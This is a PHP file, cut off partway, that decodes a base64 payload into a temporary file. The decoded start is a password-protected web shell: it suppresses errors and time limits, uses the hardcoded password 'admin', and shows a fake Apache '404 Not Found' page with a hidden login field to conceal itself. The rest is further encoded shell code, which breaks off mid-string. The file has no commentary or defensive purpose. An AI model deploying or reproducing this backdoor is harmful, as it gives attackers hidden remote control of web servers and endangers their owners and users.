<?php
$tmp=tempnam('/tmp','FOO');
$c=base64_decode('P'.'z48P3BocApAc2Vzc2lvbl9zdGFydCgpOwpAc2V0X3RpbWVfbGltaXQoMCk7IApAZXJyb3JfcmVwb3J0aW5nKDApOwokc2FsdCA9ICJzaWxpYzEyMzQiOwokcHN3ID0gdHJpbSgkX1BPU1RbJ3Bhc3MnXSk7CiRwYXNzID0gJHBzdzsKJHBhc3MgPSAkcGFzczsKJGNoa19sb2dpbiA9IDE7CiRwYXNzd29yZCA9ICJhZG1pbiI7CmlmKCRwYXNzID09ICRwYXNzd29yZCkKewokX1NFU1NJT05bJ3NlcyddID0gIiRwYXNzIjsKfQppZigkY2hrX2xvZ2luKQp7CmlmKCFpc3NldCgkX1NFU1NJT05bJ3NlcyddKSBvciAkX1NFU1NJT05bJ3NlcyddICE9ICRwYXNzd29yZCkKewpkaWUoIgo8dGl0bGU+NDA0IE5vdCBGb3VuZDwvdGl0bGU+CjxoMT5Ob3QgRm91bmQ8L2gxPgo8cD5UaGUgcmVxdWVzdGVkIFVSTCB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjxicj48YnI+QWRkaXRpb25hbGx5LCBhIDQwNCBOb3QgRm91bmQgZXJyb3Igd2FzIGVuY291bnRlcmVkIHdoaWxlIHRyeWluZyB0byB1c2UgYW4gRXJyb3JEb2N1bWVudCB0byBoYW5kbGUgdGhlIHJlcXVlc3QuPC9wPgo8aHI+CjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgIi4kX1NFUlZFUlsiSFRUUF9IT1NUIl0uIiBQb3J0IDgwIDwvYWRkcmVzcz4KPHN0eWxlPgppbnB1dCB7IG1hcmdpbjowO2JhY2tncm91bmQtY29sb3I6I2ZmZjtib3JkZXI6MXB4IHNvbGlkICNmZmY7IH0KPC9zdHlsZT4KPGNlbnRlcj4KPGZvcm0gbWV0aG9kPXBvc3Q+CjxpbnB1dCB0eXBlPXBhc3N3b3JkIG5hbWU9cGFzcz4KPC9mb3JtPjwvY2VudGVyPgoiKTsKfQp9CiRjb2RlID0gIjdYMXJiK3RJbHRqM0FQa1B2QnhQMjI3TGV2b2x5OWE5c2l6WjhrdTJKRXUyNzIxNEtKSVNhZkZsa25yNWJ1ZjNURjVJTnBuZDdJZlpUVElaQkZoc2RuZVFEUmFML2JSQUVPUUg1RXVBSUVIcVZCWEpJa1hKOXUzYjNUUFQ3ZHR0azFXbnpxazZkYzZwMTZuRGYveVAxTjZLNmppeXU3SjBmMVJwdlYrV3RPV3ZWcmt2dnVEWUJPN05Qc2Z6cTZzZnVhV2Vxc25jUHNka0ZramlFMHA5QncvM2ZkbTlGMDNEbFEzWFdjRjVxd1ZPa1FWSnRsZjRNc2xZZDZlV3ZNc0pscVdwb3VDcXBwRXlSVmQyMXgzWGxnV2RqeW1oeVViZlZYWTVQb2xnMEF0Qi9iUWFBeXFwam1VNktxQkZORnhYRUJVZHBSYzRLR0VJdXJ6L2dlZVRYY0hCTDdTT1NmNERYd0RDc3FpWXRFM29aYUtpY2w5enN1YklzN3pxUDZuV0RMOUk0Z0tlRVFDR2IvMG4yUkJOU1Y2Wnk4Q1lScmFBZ3l3REordUErSVB4L1RBdjJYOWF4TDhvNzFTOWp4aUh1UFBPN042TG1pd1lLNmpva29TNG9RdDlWZXlhcHU3QlRoRWtjQ3ZnSVM2TmtsUURFdDhoaHFtb2xPeW9UNmhDVW5LcEIvRHl4RVdaOHNUU2dMVkx2UVNmNUlOMCtQTmVOSWNHcWhKNlhGM1BJSVR2NHNXVVR3S2w5N3l1NmpJUGRRbmdFSGZrZGVnczI5UjJPV3ZZUmQzQnN4Q1ZpYVhhc2dOSUpNR1ZWM2liVCtnRFZGOTVKWjJBZnhuMEw1dk9wVmRYRnlEV2hjazZhdUErbjF6WlNuK0ovc3R1ZkxtTkN5QjFrWURYZnJzOWppK05aQnUxays5cWdqam9DbGJTdFBzOGFyNWo5dHl4WUlORUlyN0p4bWlGYjFZYTdVcmp2bG12dGpxbFJnWHFyL2E0bFhlcW9ZSXdydkNPMEpQdmRjUkdmcFV6YlE3SmtHdHE1aGhWTkJabWxkdEhoRTBraVlnY1NvWlVSSzdWdUs0VXNDYUZrcXVsczJZRktqWjFYRm1IL3JRVTYzNklwUXZYWklXaDV3eTc2RzJGQWlQMjVTaTFzWXJKb1Q4UlNpU0ZFb21LNFpRSUlVcCtwenIza21wN0dTTlZIcE84Sldzc0JaSkgwaEhmUlFWRG84eFZ6ejVFWWFkeGdGZ1Yza0N0Q04wM1MwTUhkNVF0V0txeUlrK1FpSXdWVTlCVnhFZlVJSnJMOHdVQ3JVcGhXRlVpY0RnZG9KWXMyOVF0TE9KUU5zbHpINVk0bkk3ckJzb2lqcVdWMWVSaHJWRXB0K3FOMi90bTViTFVLS0ZIcnlYY1I1L3dPMnlOaHJhTjFPRWUwckNlWW1vWUpJN2dGMzIzRUZCRUVxcFpncXVzZ1A0aEsvc0Jza2FNYWtKU1lnbllnNU9YUnUvVGlIRTlFeFVVRlc3RkZvdytBaXJ4Q2Y0T2RiSGdjRXVhN0xxeXZRclZSSVpDZzJwNjNVZXlrdnd1UWtybEdNTmdZSkxwY0VuRXFqMkJVMnk1aDZ6WjJ5blNLN2JnQjc3NG51TnBZVCtkQjVPK05FS0lXRHowdWVBeExrekRzUVNERXpYQmNSQ2R2akFWRUdxRzFsNEtBSW84S2gwcXgzMjFseEtLVUlXdlBaSHBEUTBSYlBJOTBtOEhqUXM4R09rSnFKNDFIb0lRd0NBMEg2aHY5N0drb0U2QnBJaU9lR20rS3NvMnNoNzNxa1VGUURFZHR6c2w5djZlV0l2My9IR3JkWGwvWEcrMnNFbGMwcWNFM2dkWWJsVE82NjNLZmVud3NJR3RkVmMxSk11MFFWTDRUQzZUemZGTTRyMkZtQVE1amdvbWxFaVB3MGhKakxnbXFGYkJuNkd0VVFWQWdyT3lwS0tYTkFlU3l1MXhNQzZZUGF5RERqTDBPSGx0RGVzMmtzc250dHlEVis2QjI5dUgwdkRJd2tLWEE1NzNTdzlmelZNaHJ6NXhZb2F4d0Z3RDVJQWdVcjlDT3NQSElVUHBJQWg4WkFTOVJFeC92MnpqQVpnYUtWTWpob2Rrb1RlU2gycHZ5R01tQjcxNU9lOXNPb0tqV2lRQlFZSThJWkRWUWpCcjhkSnd3N3JESGg2R3ZVRUVpWERYNWxKRjNKT1FCK3dodHBuSlFsVUhpMEZtUkF5Z0tzV1Y1NG4wY1VpYThORHJDeU53STA2aC9vQ3FFVGMxaDBFeExJK1JTbmlqemlwTHpSdUpZbkhYTHloeUh3L1JtSmNXcjFiM3dzV0QxbE9GVC9KZkdGM0hLb0RSSkU5RU1KQUFGWHlGcGhaL3lZV3B5a2RrVXQyaGJYQ3VyZW93T043YnNvVkdlV1FrS1prRWp3d3Foc1Zqam8rRm1WcFJUR0RpM29DSngxbjNqMFBUbFozN3ZpV3VySUxGcElRd05HQ2k3NGltYWptb3FZcnNVRlFoT281aWpyMVJMMEhIQnp3VEJvRkQ4aVBZdGpBbEU3NW95bmR0NnJ6eDlTMzYyWVZmVkZRa0JhV2FsbXo0b3pkcXdGakJNeTJxR2pEMXdybVNRaWNSM2lCRTV1d2ZhZlBlZndVcUEybWhsY1I5ejBlMjZqTW5EUHMxa2lmVGtUMGlrT1FnVzdsQ1lORTdlWlBvR3pZdVlMSmZZalBSUWdzYThjNDNqcWdzd1FGRHZUZVpvQXFQTkErWlI1MFRNTThEWTRac0EvK0ZvRnVGeVQ2U0JVMzd3SE02REJjU0FrR2NkdEc3NDA0MVdEUG9BdW9YWTNmSG1pQURpLzRWa0hwd2U2N1FSYnowdEViVXBhNDVZUXFOVlFrdFd6YlRQNlhRZG5IUGxZcFVvdlpTNkJuZTkxVERHcnFjYVp5YnFEdnJ5RnFnb3E2aU9zbWVLUTRkSkZZSXBTb1JBdWpSSTRlTG9XVUxCOU44S0lJRUdiM1JSUTZCRGRka0k1MjJKb0J0SkdoRFNFYVBLWTkrR0cxMzZBYVkwYlJWVjEybTNKSEp2UWxJa2V3NGdqdVVIaUtDVzV0Q0xFQmpBblJHY2FaUFdPNGpSWGlXK2FUYXRJcUtLa215RWRScHl0VFc2MnBjRWI4YllDNk1WNFdvT2hwYXRYeENmL1JOMTN4eGh3Qzk1M3NrVk5mdnFXZlFDOGgxTVNMZVdDMXRPUkJscFFoa0VMUUNML0VFaXFDZ2MwQ3lHUXBqamczWjN1M2I1dEI2QnBzbDI3b3pCeWJqb1VNRG10cFRaV2tlWEo3Q0VkR2o2REFEcVBYRXhxWElaVmZwYkd3L1hWaFM5M0R5ZXJhQVoxKytwY0V6S21SODhFUW9ka1pGTGJkbm1LQi8vZlVCdFg1NFdVREVrSmhpK29MWGhtamR3WDMwMTEwd2VwQmhBS3d1N3VkMzRSR0c3TU5nbm5wNFlDQmR3dnhsZ1BGSVE0QnhWZ2dZRjRmYVlyTytUR1pkeWZnbEFacXhlRXVCSktIaUZXQlhaRDVHc3U3Nm1wbUZlQ281TTlza21sQmM4alJVS1BwYWVsYTdPUFZlL0E0R2pWc1hOTFZ2N0lxSTI0Z09tYWxpMnJCZ29ZWDVKRXdhc0RDUjBUSElldzRYMlFhUjFzL1hiN25qWFpWUFlBYnFlRXVFRExRTUhjSXViQ3RjMVZVSEdZUWkxRWdvZ1VjZ05FcTZmcFBCVkNRdHhVTFF2L25Wbi83OHIzNzl5LytIVjFSL3dBV0ZINFNSNElob0l1UHV1c09CWUs4c0V3ckxDZnB3RDdxOERNYktSL0xMM3hBV2t2bm04L2FYcVRqR3h0ZzZSOWE3UTJPcXpscnBkTUdDaVlYUjMvMkdkanJPK00zWXNjd0dOV1N4TmxjZm9Na0hRMEc0UjB1QmV5Sk5DNmpFbTFpS2s2dzdaaXFTMnd3YmNtcUlVNnhWbFFJejQ4K2tRcHIrQTFaMWJCNi9DMjNIaEQ2YndoTnNpM1ErKzd6TzA3Wi9BN1hQZW1xZi9heHFuLzFSN2IrcDJuT0Izdk9NanZ4QWRCeUxFcCtFSXhJYm9SUmx2MVpKL2w1VGpRSGkxY3lRVDBIaXQ1VHc3cVpuTk1sRzQremlEdERFTE9ZVzF1WmJrblM2bVJXV2Q5cEEvam5rTDFlSWJIcVJRdEI5czdtVitHWWE0ZUgwRXo0Sm5TZ1lvcXd4NlB3RTB4QTFWUnhBcTRqSlc5U0Z5QkF1a2pkc0dVUHFpUVFWQ2Rwbm0wb21BNEtmWllUeGxKZ2RZUmFNQmd2YlBwODF3YUR4SjcvK1QvOW5adFJoUjYyZUpHdXlLMGVWRlJUenovL3MzLzdmWU5qMlRkN1h3V3FuRjZ4MllPTUk5bzJHbXVadjFKS2RvMCsxamZTbytTV1cwUVA5YmJLTDVDUjYxaXI2bklmNXdUNW1HSjRsSWZodmJ2NG8wZS9VK0NHYTM3ZnA4NnJ3dTIzNEdJbVoxVzJtWjJlTlhtQzlob09oTFlCSEJSS3JWOWlzeFhid2xjZ1dHMERBNVNIalp0WU80ZG0wcHgxLytBKy8vSmN2bUR0L0UzNCtieW1wb2ZUcTVGbkgrZkNhRC92WHYvcHZmd2V3NUVobFpSNDh1TXo0WmVBRnlxeEd6QzlqZ09qR0hrcjJqa1lnTDNUNDRjc0RzYy80M0VsOWtqMy9LT0trNHUzNis3bDcrMXdtbmQxWTlmRkNhb0g2RlVTaHZpU2dIemtmTXpLbWhrU0JVaGdta1YwdCtMWGtTYzZneTg2Z0Z4Um1jRVJRNkYzL1ZCcWo4WExKeVFuREJ2Qk9XQkoxaVRReWVseXpUQTRKbC9FcEUvZ0FPYTVndTNBQTlJN2trTExCQ1FUQWhCeWpBQlNseVlZVStBOUYrNFR1RU13UVIzVVRLV2w0eExRU1M3YnNERFhYWVlqU1kyRXk4dEpzUFBhU1p4aFUvZU04a3NRY2tqMWJDemp4ZGhWN0dNY0VMKzliWlFNK3NybW56UGdZMEFqU1BmSlJqRXcvdTBOTnBXNXFDZTlVRWY4bG5tMnEwZFBBT0lIRDJOYkd2U1JqUnpmL2NCTHYzL2p1ZzNEZVJsSHhZNTZ3cFlmTVA4WC9SQWc4UVp0NytHVE05eThNVlVuUXU2cTJzZ1JXS0VFQU9Mb25iREZrY0Radjg4SEIzcHNlUGducldaanlFdkE0Q2ZCdzBBZkpDYXgyUUN3Z2IrR3pjaXNiVjMrbzV0aFdYUXlYVFdDRW9icGIyV2pWVVVWQTFpemI4empBSGhEWUp3aGxnSzhOOFdwWmVTUHJsanVseDNiTVVTMCtFL1lPODN4VkQyZmFVYW9TR29zMEV4cUpGV0ZvYTNTK0tOQ2p6c0RkRC9JS25ETldYYWduU0FkQ0w2SnNibms4UnBLNXZJdnJTOXF4akZOV3NYc0RsRVFQNjNWNDlsQ3ZGcnFJdVlPQ2gwR2JHcE13QnB3Q0dOWWRjMmlMY29DcHVBZ1I3ck5sTk9Ha3NqQkdaUkx6b1dYVUdvQm1DSk0wVE5sa0tVR0NSV3N4VTMwa1VrNEVEMGw3ZlF1QWMyRk1SNVZXbUpjTHk0c0lKb0lBSjRWN3c0eEZJY2s5QVJtelhZNitCemJOQXcyWmVuYmV3bWdidUVYczR6R1B6Y1NDRGUvN3k4c0YrZ2dHbE1CelgzRHA5RVk2dmNxOTVaWnRxUC95K2p5d0xBVWJMd2JMVUxESllqQkU5U1ZFRWRXWEVFVlVYMFEwdmZFaW91bnNpNGltTXhHaVhyZGg2RUxNbUUxL3drTTNPMnNMZTV5RW5FMDRQc0hmZTQ0bXhPOEpITG5Bbyt1K2k0YWpmYjdidmxDNmVYTmN1Y3pXSjhkckc1WlMyN2lvWFpRdTBtbmhkbklpZExaMFlmTFliWjVOTGc1UEQ5V2JpWHAyTytqa1RvL3FWaXIzcE5VdGMzdFN1OTNPNXg1R1BXNnRwKzJjTnE5R2FJRlRibVF2V21iUDNyUnlYWHRINmVqS3pYanI0Q3F2MzVaMk5QMmh2bkY5TXozTW04MHJvZFRPbDZiVnkvSkZRMWl6R3VXTzI5ZXY3Sk1LZDVrNnFpbkQzbFUvdTVIdjJ0S0dvVCtZK2NiazRIRjZVUnFPTzNWcHBLT24wNU8xNlZnN1VHMUZ0a1RYSHRhMVR2NzhSSEtmN01GRHEzMDZyUjVzWk83dU9PbTBWZXVjZHRPS2VUM1dyMHZpMksyNlcydjZXdVhtdEgzU2RodkhSNlZ5ZW52VVRzbFBXYkUzSHQwMExWY1ZwKzdBdk5YYWZlMG0xYnRRaDZXbnc4cFcrNHpMdFhwdGU3eGhaaTh6eU9aZVBqa25kcjFuTmg2MHZOaFRPZytqbXVBK05VWVhJMk43emRrMGR5N2RmSDEwM1hqcTNMWHpHOUpWSDNWZFAxM09qYS9hcDhNK2QvMllyYmFxeHNQaDAyaFN1ckdVU1Y2OHVlcE43SzFMMFZYT0ttWnFSOWg1M0RuSW4vV3R3ZFcyV2UrZm5uZEhGM0pMT1Q1M3VzMTZmU3RmSzZXMTlPYXRkVFBnamc5Yk84Y1R1NTJ1YnB5cFQ5ZWRYbVh0UE5zY1NyMitxdDUyNnhjVHRlbktYYnMvclQzMEhnOVBqdExicFk1YWVybzlFUE5uNnVnNmQ5NjJqcXJ0N0NSenN0RkJTN2xKeVZCSHQ3Yzd4KzJxVTNuc1ZOZFN2VzNuWUpDOWFGeWRpb2VsMUluclZEYlBEL1Y4NWZwbzdWd1JxNDhENnlaOXJFK091by9kZ1hUUU90Y2s0YmpoWEo5eGQ3SjVLTmViMVlPUkpmZkt2UnVsaDJTbjN4cU1UdFllM0ZPMXNUMDZNNVhiMC9Kak0zdW5uemNlTnU0MisxZDN2YVo2M2xXMzFNZUJaQndMZHFWeWN6c2NiSEhEUzdjbERYWEhUaCtYTng0M2JmdnBRdTIxdDUxeTdxNXpyVCt1bmJXMXRyQlo3MTA5dEFUajd2YXF2bmJkdy82S3JQQmIyajUvZDNlaXRIWnE0MHBOU0ExU3BkN0RRT3MzczBKcDdhQ3FueHdlWk1UTzV1QzRlWGYwMURyTlhrMHNmWmdkYTdmbVlhcHJEdzlxUGRXVmNybmg2R1k0R25Yc0RIZWgzelE2bWNQT2RQdTRwcHZwck54dFNKbjg2V09tWEJ1MmN3Y1hidWZvNmVwTzd1YzJzb2ZLUkx3ZGkrWFNzVnp1bEkxTS83QmU2YXVaNmJGeWRudnoxQnYzT2ZmaThWUWV1cW5wNmNtRmVuMnc0UXh1bFg3dVRoYlBLeTFEMDN1bnAvYlRodG1yM213cHVjYmRTZTd3V3IrdUNtYkxlYXB2UDB5ZUxnK2RkSDJuS1YxV3JnYUhuSnlhT0tuKzROYTV5QjgybGFOMFV4eFhUa28zUjZYSG8yRlBseDZ6eW1tMWJPakRUTzFoMUJoWXgxdEtKVlVlampjZHNkY1NPcVY2dTVLM3pqYzc1K2J3UE0yZE5jOU84OGZuT1d0NGJsMG8xcmE5YzFmdGJHNDg5RGZITjVQTjI3dXpxK3ZwNlUzN2FTeGQzOXl0dFhLcWZtdTI4NUt6ZmZKNFVhOW9WNjBIWTNJcDdnd2FkdHZrUmtJbkoyNWFRak96NVR6Y21WdVByY3J3NnZRNmMxMVBOWnBHOWVSSUVQcGl0ZDE5dUc2VkgrWDZYZlpSZmJnNDZ6elpoenVYTFRtWHZja2pqUmlkcDdzUFJ3ZmNtaUtMdmZwVlZXdHRYSXRuellGZXk0anliYTV0VzZmbjA3elV1UzYzeXdlOWxuWjFzMVVmVDNmMnNmZVVJQTVncW03SW9ydlA5KzZxamViTytiaGF1K2tkcEp6TFRuT2NWYTV0NDNGNldVNlhyY1BjYWRNZFBTcnBtNFlsT3BYTTZjQThyYVp1MUpaYnJyVzMzT0htNXRyZFRuNTZ1OWxKTjExdTRCNGQ3QWlxNGxqMlpXZlFQamgxK2taR0dHMCtsUzh5NnRXUlV4OXRWTHZDWU12cTZCZjk2OVRKOVZWNW81dlRHdGU1ZzhaMnZmb29WaFhMUFVjV05ydnp3RFd6WTZVOTFNbzlyWHd4dW1sUFU2blRyZDZaMUttdE5TOUZlWUFVdDZsTmFwT1cwWkFFOGJCWktSbWxyZjdkU2VQZzZOeFN1dU55Ym5oNk1kNHBLVGVWMHp2dVFjalZkRkc3RmZyS1ZzYkluNXgyV3lWbHVGMHh1eGU1cSs2Ry90QkpkYWQyK3FCcGlMbkRYS1hUZjVTM2UyZjF6Rml4Tm5VMEJxeTV4K2ZpeGJGMWROMFljeTFuTUxLa2ZIYk5ucGluRmNtUzdOR2QwaitRalpROFFSWW9aMVN5bVEyMXRZa0FVdVZ4THJYNUlEd3FwMmQ1dFZxMWhxZVh3cmgyMXI0WTc4LzBCb3hPTiszanJ0Q3ZUU3JINlp0VVRWS1V1N1ByVGpYVHk5eWUxZzVrcmZyWXV6dlIxR3M5MjlrMnUrckp5ZGxaUjB2bE53Ylp2TjFScHBVbmNlMHUyM3F3bW81c2w3aUQyNm03a1RucGFWTFBiUS9GbkxUZHlEL205VFB4U0M1VkJwdGJXMm1uWFJJR1lxWjY5Vmc5bUR3YXl1Q2dyZFVPdGZ4bUt0Y1JObkk5eTNTbjVkSkJJNy9KUFQxWlQ3ZWw3Ykp3L3JnNUZhN0xwNWwyNmRZYVd0czN3dTJkZFZuSlhKVHMyb0YrMEhqcXQ5MzJyWGx5ZFM0MlVnL3QzT2kwbkxGclcrTitVNzlJR2NncWIyOXk2bG8ySXpZMkxLTjkyN2tXUkUwZGllZm5xY21vY2ZpZ1RKM3VjWHNzeWVuTzJtbDYvSFNjNzdxNTIxN2pValg2WmExZE5sUjlXMGpkRFUvSzZaUFd1SmNyY1kzQlliclhXRHZJMzV4azlhMmQzRVBxMHJxOFBhNEtvODVHcnZ6MDlOU1pWbXU5YnEya0hLZ2QxVGc0THBzYnBadW1YdFVtNnZEeUlGZEpwL28zOG9PS3V2aVdleGlMdC8xaHJTUm5qODR2MUllNy9NUFp4dEh0WTZ0NWtDK05LdnJ4MGNNZ3BXZnlTcVo4TkxvMGoydTNtNlZNWGNtNmxkeE5UYzUwSjZmajdlM2IxdFRkYW1XcjNGWXZQejZxWEU1UWwxVUhvODM2bzczaFZqYlBiaXVHT2EzMURzZlNzWGh6bWxFMXUxZVNycnVYbDJkRUt0NFd1VDNGMWJYaUhseTlLZTdwc2l0d2l1dGE2L0xqVUIzdGgrNWI4UnhkZCsvampiZ1VGRVFUYmdYTmxtUjN2OS9ONWpKWjdCSG1xcTRtRjNkM20rRE16aDNCVmpkM2pNUlB0cm1TclUrNXkrTkxiaXgzOFVLYlcrZllPenE3dTNzcFVwemJJM3R0Wk51VFVBeDI0UGdpdXdhSHpUZ056YzBUWGNFZW92bWFaSXBEdUxZRmU0b1ZUWWJIZzJsTndqQ3JTYnlibUlTYlhwb3dSY3U3WmNNMFpEUmRuRmNLSTUwdDFkVk1jYkFNTTcrOUZLa1UxQm1nMkNxTGpvUHEyaldsNlVjT1ZMQ1B0NXQyZjVMR1AxQmFRQXNHdkxFSnV3TTJ2czIyQ3pYQ2VidUtPWkp0Vk5TMEpkbGU3NXF1YStxN0dXdkNPYWFtU3R4UE5zbzd1VklWWUwvOHlQVlEvNnpEUnRWdUJvRVV5SHRQMEZWdHV0c1NGQk54cUMzYmttQUlpWkt0Q2xyaUwvN3F2L3dQMUlXbVp0cTdQNm5pSDBEMUU5VDJZYmkrR2Z4VDRCaGZ5aXo2ZjRQODlRdHh3a2ZPMjRhSHZNd09aUG83OUNHVVdmeFRtTk40NGlDK0RoTnhRQlltNHJPRnJXRWUvaFhtc3lxSGYzd0ExN1RpY3IvbWtxN1FOV1QzbzFmdHpDYUNFb2F1eWFYeEh3L0RMaGRmWEJkVUEvVXA5VFJJcDMrS1UrRVVDRFlMTUsvWmZrdVNQZjU0ZGxOS2lITWVWekVqNXJiUjQybDhHNzFjbjJoMzZNYlRwU0xoMWRMclFPaHZ2MUtzRk9JZkJqSHBvQVJENThXU0hGOTFobC9tMElVakVyOS9RbjBTVTRUdENFVlcrNHBML1daakZkSS9SUExrT2tuOHNtYzZGQ3ptdldyMHpFRGlPY29nbE52TnNPcVl3K1NDOHltZnZ3SGZ1dGtYRkFqSldmZmU3V3JVZG9RT1JVTGRoUjJlbVZiNVNaVFBObVpJdkNSYmlnVU41UEMyZjVnQkFVTGlVaDBDbHhZS2xZaC9BaFJiaURhWWlUQU9KWUgrLzBRTngzd2NrNjQyVEZzWHRCQnVKWnRnWDhCbXhUQ1JNYVpia2M2Zy9JVk84cG9mWjloWVEwZzRSSDJnWjJTSnBpOGNDM3dnek43bldCRDBEN2JBbW1ySTYxVDRzNTZNK2dpVlFJUnp0RFBtOFRBb1F4U2FTN0I5OW9yaEtzQmt4MXB6S2pNSUVNNnRZZk1zREZBNXJKUXJCNzVRZWVwTHU4WWZsN3gyN2RBMmUwZlRhSkpBaG5MSzM2QjNnOEVLait3d29NT0pKNTRnY1hzd2tuT21jV1lLMGo0L2I4YXdqRXpHOHFydjd3L24zSkk2b29lNlBJd1BrUFJtZlIzZlArY3c4L0RwQjNwSEhGbGZEeGZ3TFkxL1o2UzRoLzN0OGZFbzQyVFBZNVBBRjZOZWt2eGJ2c2o2SlBEZERGL0VzelB2ZmxmSTY4SXYvaGIxTEwzUmpqcW84SmFGOFp6OGcyTlZCcHFjbEx6MWN0a0M2QTAxYmFiNXNpRXhqWWM4UE5JVHJ2Z01VUkhUSVIwWTRiZU5JY3g3VG1CQW5DLzZMcERQQTdQM2VQZ2kvdk82a2lpVEw4b2o0WlhGOUtuemlBamlQNjhtU0dTQ1ByeXVOSnJnSVBFM1ZUU1Q5aDlmaDJGb3dhRUpYL3p6di83RlAzOWxtd1VWbW94K2szS01RT0JPQjFuQVhZN1JSRyt0VHlJeEo5QTdlRDh2STFoOGtQYzI0dElDWjk2c2JNNTJtK2ZwZ2gxZG92ZXk2TFVzNWdJV2VrQW1XckJsd1FNaE14THFrUUVGc0xNTWZvaHBCYm1MNnQrdGdUdXN5T3pqeW9IOHJMQWhJQWdzaGZLM3NBbG44ZS9abUJuTEtka1ZVM0NFT2taR3FFQlhlU212emtFN3FLc0pjYTd3TDdmOHRPRDU4UVRPSjlUM2hMcWVlSjRtMkZuVmE3VGZuUENkSU1aanhOTittb0M1RWg5YVpGNFBZeVZaOW04Yk1pVlFPdHpTcHVXaVdlQktOU2NMMkRRdnk3UmRlcitZb2crQ0cvajBDamlUWHFPTVVpU1o5R3AzbENiTkpEZkNvMVRKMFREcVVqaFl4YzMydG01V3ZNckFuZnlraHlMaDFTTGhVY1QxMXAwK2Nkd0EyeG4yZXNxampnNHQxTWhjeHJzREJUdEdmbW1yV0NiRVpZbHo4WmtacFRiSDArMWQ0T2NXVjFrR05iMzhpMy9Ib2xxSGk4RVVYUWc0N3FvUGExTHhNNlcrejFiRXk0RDY3N05OOFRJc0xQdEpqNUZNQnFyN2Z0QU1tb0VkaWlVQmliZmd5QTV4S2VablkyMUlYYXpudjA4dGw3cVFGalNQM3V1SGJTSEhra1ZWMFBEZVVJZ0Q0SWNWeXg5c0huNEFMTUxKdUxGQkRtMzdNL3p6T09Tek1GRFFsRlZFU29xbWFBN3NoMEVBQUdJellGendBZ2lnR1FLMktIQUNidGttMXVNQUNxZUVnQUJwbUFpTTByd1g0UWdsenhGeWJMbmZ6T25jMlR4VWc4ZWhiT05ZTlBqU2VKZUpGdFhGZGhMbmcwUFNZYU4reWJWS0IyY1ZybGJsS2plMVpxdko0WkFaOTVoRTRZTlJibFJLclFvRitobVQ5ek51aGZzWmpKWS80ODdxRjBjSFovVUQ3cUxlNGk2dXo4NjRWVlR5ckY0NjVBNUxyUkpYdTZqV1VPa1BQRE9TZnVBL0dMV0xWcDFpWm9rMksyZVZjb3Y3a3FzMjZ1ZVI2anhiWTQvRnoxdnB3RGcvZXdYbkcxK2ZtVk51d3BURHN2T1NRbFM1d2lSOWpYc2hCdERDR1F4RU5WK0lBYlJ5QmdOUjFaZGlRSUl3aXdGYmdaZGdrTHJod2xMWEw0ZlUxNTlTQnZTdzJETmUxV1NXT2VPL25OLzVhWUd1N0wxcnprUmptRGtmS0RNbU05KzdPUDUrZCtnaXVGZWhaeTZQcHlnNTc5NGludDJEbkdPSmQwSVJNSHpyTXVldWVJdytmUERXdDBwUkdLRTFCQzVJVVNQclJ6a2IzTW9HeW9xQWRDNllTMm1xNHhMOVE5WlY2bUxmTkZRYjRnY0htU3VrcnF0QkVld1FkVytiNHhXQ0RFZHZ3KzI0dDRhT1FnczRDVm9RdThtUitCUWtZNVh4cGFTVkJWZEtBczFPMVJiZFpmNGV4ekRnYVhqc3dnL2t4aVYrakxtNXdRd2V2dWR3L0pUZkd5RStiWUFnd3VPblVtVHN5QkcyMGJROXlhQVYzRm50dk5iaTBvbE1PdTNaNU1jZmpmSVAyU2d2TElmRkpselUxNGR2eGFRakFyZ3d0bXkvWFdaZE5MV2hic3phOVZlYjlSaExqZXUyd2plUDZ4MnVXcXVjSFRiak5UaGl2VW1WbmpIZmpNMVZpclFJSGphZ0hnTjRCWk5DMHFQV0xIWlk4U3BMYkEwSnIvbmw2dHdLMDRIR2RBVU5hanFub3JPejdDZXlUTEtFUHRpOEZkVndWN2tnS3dnWWdyTXpCZkpvNE5hQWRlT0FKTTBWWlhBUHhsWGdVajRnZENEWmVFWG9Wd2ltZFM2emlzd25DN0t3OWM5WldsQlVJSkhrRS9nS3U0ZVZCcG1DQmJVVDdUNGtSS1lZMzRHNFA0S2dLTGcwaksvd1JQYUxpUGMzZnNmQkVpQVdHN3h4L2tvenROcUJRRXVRalVlMG1jRnN3ZmkyaFBlMG95T0hOMTVrdkNPakxhTFd6MStuLzNIWStBRU5HNWVnYW51T3JNbGl6TDFGaXVTSlhPMVRJRExvdmg5YXl0YVR4SExqQUZORk5oUmtwZ0NCSVBkOXhTOTRBU0N4cUdMNU5TM3NTc1BVUy9YQ05Lb3c1SkI4UDV3aGFCQmpqVjZBaVNPTmtrR3V2Y2RZL0YrenlGSUV0TGhubU5URjV0TmpXc0g0RmFCaFI3RmdEWTZuZlVsY2dTVFo0b2lmcmpJRFoyU3ZPcGl0TWpHd0YreHB6TVI3WnFhN1AyNE4vR2hPZmpqelNEclVFNDIvbDdxd01sLzFOSVdOaGNzWCtBUkpaUmZWRkF3R2ZaTEhqUG9rZ1Nya3gyRG13azVjZkl4ZzRNZ1VnNTFoV0RORHVlOHBrSVV4ZlF1UDYxdFJKaGZZZmVrRlc5bnZ2ZkE2NWlBK2x1cFgva2w5WkZ2MjFSc24vc2hBd3RKUnRxUFoxMzFQbFRYSjhTZWVORkFkTzB1TzJaMzJabWhROXA3Y2tzUGxFMHNxdlhhdFJQYVJGOVlCelh5ak5VRGRBS243NGJrZ1htcjRjK1NZcWVESzBnTmdmMWpVd2dlQ0g3b2NTRUJZNDlEazhDazBPeVFUYXkvZEx4R1pOb0wrQWdpOWN2NmF1U005M3YzdXBVNjJiZE4ra2VBeGw1OC9zdnNyc0VDN2JOVExsV2J6ck5ac0ZUNFlPS2xkYXRSZzk3dnBKVFJicGRaMTg4ZHQ3eC9IdGgvUzJJWmEvZTNzZS9zSHo4L3ZkNk1xck1Sc2RLTkI5aFc3M0FoSmdvekwvdjQyU21MSFlXZ3BYbmwzZjFlMnRXRUhXK3ErZVB2YTg4Y2d0OWdKUTFuREhiYmJzU0ZMUk1Gd09lclFBUjRWR0NOSFRtcXBuV1ZPV2IzdmE4dzZOZ1dlUzhqK1Jjd2ZWVVRQUDJmcWUrM0UrRUxOcUhHazhNUXZUTnpWU0J4azFrbUt1TXp6WVdlaUhQYXlEdUw5Z3E4bWpDWDdmSmIzWEVxZytlZlQ1dFVaRTBiWEV4WjIvRHBHUWhBTnNSd2lsczFpWW1IZkpjOXhDWHJCOTFRaUV1VTNTVE5GZ2FhRW94bkgxT0lhOVJFTld2eDVhZ0l